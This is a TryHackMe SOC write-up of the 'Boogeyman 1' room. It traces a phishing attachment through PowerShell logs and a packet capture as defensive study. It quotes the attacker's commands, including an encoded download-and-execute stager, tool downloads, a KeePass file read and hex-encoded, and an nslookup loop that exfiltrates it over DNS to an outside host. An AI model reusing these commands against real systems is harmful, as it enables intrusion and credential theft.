
# 🔍 TryHackMe — Boogeyman 1 | SOC Investigation Writeup

> **Platform**: TryHackMe<br>
> **Room**: Boogeyman<br>
> **Focus**: Phishing , traffic , windows logs analysis

---

## 🎯 Scenario

The Boogeyman is here!

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

The security team was able to flag the suspicious execution of the attachment, in addition to the reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial  vector used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

## 🔎 Initial Overview

My first approach to this room is to check that malicious email to gain information such as the sender's mail, and to analyse the attachment with different tools and methods: using the hashes to investigate, dump.eml, lnkparse... If I can find any payload and analyse it, I will get some precious information, like the sender's intent!

## 📧 Email Analysis 

<img width="700"  alt="Capture d&#39;écran 2026-07-02 140447" src="https://github.com/user-attachments/assets/6fa1c31f-478b-42ff-a596-356defb6c20e" />

First of all , i open the Email in thunderbird and i set the view header to ALL. To get information such as the victim's email,the sender's email,the name of the attachment ,and the third-party mail service. And to analyse the core of the email.
The phishing email uses a payment document as a pretext: the victim has to download the document to get more information about that payment. And the moment the victim opens that document ("Invoice.zip"), the computer is infected.

As an employee of a company, you should immediately contact the IT team or the cybersecurity team! Do not click, do not download ! just wait for the blue team!

In a controlled environment like the VM machine , i can download the attachment to investigate it through static and dynamic analysis !  

<img width="700"  alt="Capture d&#39;écran 2026-07-02 141126" src="https://github.com/user-attachments/assets/42348702-3cd4-4e57-9e08-1a28a7ba798d" />
<img width="700"  alt="Capture d&#39;écran 2026-07-02 141145" src="https://github.com/user-attachments/assets/da1f5e2f-3f02-4c3f-b310-bc526c35d694" />

I unzip the attachment and I use `lnkparse` to extract the information inside the payload. I found some pretty interesting things, like the command line:

```
Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

I decode with cyberchef :

<img width="700"  alt="Capture d&#39;écran 2026-07-02 142023" src="https://github.com/user-attachments/assets/f328e479-4190-4cd5-a780-49e9efb05793" />

**Decoded behaviour (download-and-execute):**

- `new-object net.webclient` — instantiates a .NET web client.
- `.downloadstring('http://files.bpakcaging.xyz/update')` — downloads the next-stage payload into memory from the C2 server (nothing is written to disk).
- `iex` (Invoke-Expression) — executes the downloaded content immediately in memory.




<img width="700" alt="Capture d&#39;écran 2026-07-02 141233" src="https://github.com/user-attachments/assets/bb42a168-69af-4bc7-ace9-7ad97f85787e" />

I also get the SHA-256 hash and check it in VirusTotal to see whether the file has any classification. For the room we don't need to use VirusTotal, but this is what I would do in a real investigation.

---------


## 🚪 Powershell log Analysis ! 


The room give us another artefact , a Powershell logs ! In this case i will use JQ cheatsheet to investigate through the powershell log.

<img width="700"  alt="Capture d&#39;écran 2026-07-02 150450" src="https://github.com/user-attachments/assets/478ab287-2207-47ea-93aa-435f533cf497" />


I need to choose the right command to understand what the attacker typed in the powershell environment 
`
cat powershell.json | jq -r '.ScriptBlockText' | sort -u
`
Allow me to filter with the ScriptBlockText only .  The field that contains Powershell code execute. This revealed the full post-compromise kill chain.  Let's analyse all of that.

 
### 1. Initial stager
 
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```
 
A fileless download-and-execute stager pulling the second stage from the hosting domain.
 
### 2. TOOLKIT downloaded.
 
The attacker downloaded two tools from the hosting server:
 
```powershell
iwr http://files.bpakcaging.xyz/sb.exe  -outfile sb.exe   # Seatbelt (enumeration)
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe  # SQLite3
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/.../Invoke-Seatbelt.ps1')
```
 
`sb.exe` is **Seatbelt** (a GhostPack host enumeration tool), confirmed by the `Invoke-Seatbelt.ps1` download and the `sb.exe -group=user/all/system` syntax.
 
### 3. Local data access
 
```powershell
.\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
```
 
Using SQLite3, the attacker queried the **Microsoft Sticky Notes** database (`plum.sqlite`)  a common location for users to leave credentials in plaintext.
 
### 4. Sensitive file theft & hex encoding
 
```powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'
$bytes = [System.IO.File]::ReadAllBytes($file)
$hex = ($bytes | ForEach-Object ToString X2) -join ''
```
 
The attacker read **`protected_data.kdbx`** (a **KeePass** password database) and converted it to a **hexadecimal** string in preparation for exfiltration.
 
### 5. DNS exfiltration
 
```powershell
$split = $hex -split '(\S{50})'
ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113 }
```
 
The hex blob was split into 50-character chunks and sent as **DNS queries** (subdomains of `bpakcaging.xyz`) using **nslookup**  a stealthy exfiltration channel that often evades HTTP-focused controls.
 
### 6. C2 channel
 
```powershell
$s='cdn.bpakcaging.xyz:8080'; ... Invoke-WebRequest ... -Method POST ...
```
 
An HTTP beaconing loop against **`cdn.bpakcaging.xyz:8080`**, fetching commands, executing them via `iex`, and POSTing the results back.


So we know that the attacker wanted to exfiltrade data from the copagny to the C2 servers. My feeling now is to investigate the network log .

<img width="700" alt="Capture d&#39;écran 2026-07-02 151847" src="https://github.com/user-attachments/assets/daeccf19-1820-479f-965c-be4203d5cc80" />

---------------------

## Network Traffic Analysis ! 

We know the attacker uses DNS protocol to exfiltration, also the room give us another artefact a .pcap. So its time to use wireshark and tshark .

First of all let's look at  the communication between us and files.bpakcaging.xyz the malicious domain.

<img width="700"  alt="Capture d&#39;écran 2026-07-02 153334" src="https://github.com/user-attachments/assets/6ae6ead3-a1d6-4dc3-8cf9-f40ac1a3aba1" />

<img width="700"  alt="Capture d&#39;écran 2026-07-02 153347" src="https://github.com/user-attachments/assets/62784041-a357-4f14-b2f4-45d49021de1c" />

We have the software used by the attacker to host its presumed file / payload server : Python the answer of the first queston ! With the Powershell command analysis we know the attacker use the binary 
"sq3.exe" to access "plum.sqlite" which can include credentials 

Lets filter with sq3.exe. The first packet is the start of the exfiltration attempt and we see the sql command used to retrieve the data from the table "note" . I change stream to the next (750) to see what happens to the data exfiltration and let's decode the hex encoding. 


<img width="700"  alt="Capture d&#39;écran 2026-07-02 154300" src="https://github.com/user-attachments/assets/5bbcdb40-019f-4708-b294-31b61d32d05b" /> <img width="700"  alt="image-1604-1024x473-1" src="https://github.com/user-attachments/assets/375d00db-3ab6-4ba2-b14d-4dd990764864" />

We get the password to exfiltrated file. Now we have to find the database and open it with the password to know exactly what data was exfiltrated ! 
The data is split between several packets , so that the time to use Tshark to analyze the DNS traffic and extract only the encoded data . 


```powershell
tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.xyz" | cut -f1 -d '.'|grep -v -e "files" -e "cdn" | uniq
```
This command filters the DNS packets, keeps only the queries containing the domain bpakcaging.xyz, and extracts the first subdomain field (cut -f1 -d '.') to isolate the exfiltrated hex data. The grep -v excludes the legitimate files and cdn subdomains (the file server and the C2), keeping only the exfiltration chunks.

Now i can  save the result into a text file. Before opening it, i need to decode the hex strings either with  cyberchef (saving the  inputs as a .kdbx file) or with  the command
```powershell
xxd -r -p  credentials.txt > credentials.kdbx
```

I use the password found previously and get the information that was stolen by the attacker ! 
<img width="700" alt="Capture d&#39;écran 2026-07-02 160420" src="https://github.com/user-attachments/assets/36103d2e-d4f6-4d83-9db6-616b4579e2ac" />

And the room is finished ! 

<img width="700"  alt="Capture d&#39;écran 2026-07-02 161303" src="https://github.com/user-attachments/assets/574dfd78-f096-42dc-9e27-c712f8ad7fa7" />


---

### 💭  What I learned

This room was pretty interesting. I learned a lot in the database reconstruction phase, and discovered another way to use Wireshark and tshark. It is probably the first time in my learning path that I had to dig deep into what the attacker actually stole. Most of the time on TryHackMe, the room ends once we have reconstructed the kill chain, here we went one step further.



## 📫 Connect

- 🎓 **TryHackMe:** https://tryhackme.com/p/LilTyki
- 💼 **LinkedIn:** https://www.linkedin.com/in/yann-danhier/




